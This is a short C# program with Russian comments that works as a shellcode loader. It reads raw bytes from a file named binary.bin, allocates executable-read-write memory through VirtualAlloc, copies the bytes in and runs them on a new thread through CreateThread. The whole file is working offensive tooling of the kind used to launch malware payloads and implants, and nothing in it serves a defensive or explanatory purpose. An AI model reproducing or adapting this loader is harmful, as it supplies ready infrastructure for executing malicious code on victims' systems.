using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, MemoryProtection flNewProtect, out MemoryProtection lpflOldProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [Flags]
    enum AllocationType
    {
        Commit = 0x1000,
        Reserve = 0x2000,
        Decommit = 0x4000,
        Release = 0x8000,
        Reset = 0x80000,
        TopDown = 0x100000,
        WriteWatch = 0x200000,
        Physical = 0x400000,
        LargePages = 0x20000000
    }

    [Flags]
    enum MemoryProtection
    {
        Execute = 0x10,
        ExecuteRead = 0x20,
        ExecuteReadWrite = 0x40,
        ExecuteWriteCopy = 0x80,
        NoAccess = 0x01,
        ReadOnly = 0x02,
        ReadWrite = 0x04,
        WriteCopy = 0x08,
        GuardModifierflag = 0x100,
        NoCacheModifierflag = 0x200,
        WriteCombineModifierflag = 0x400
    }

    static void Main()
    {
        // Путь к файлу loader.bin
        string filePath = "binary.bin";

        // Загрузка содержимого файла в буфер
        byte[] shellcode = File.ReadAllBytes(filePath);

        // Выделение памяти для shellcode
        IntPtr shellcodePtr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);

        // Копирование shellcode в выделенную память
        Marshal.Copy(shellcode, 0, shellcodePtr, shellcode.Length);

        // Запуск shellcode в отдельном потоке
        IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, shellcodePtr, IntPtr.Zero, 0, IntPtr.Zero);

        // Ожидание завершения работы потока
        WaitForSingleObject(threadHandle, 0xFFFFFFFF);
    }
}
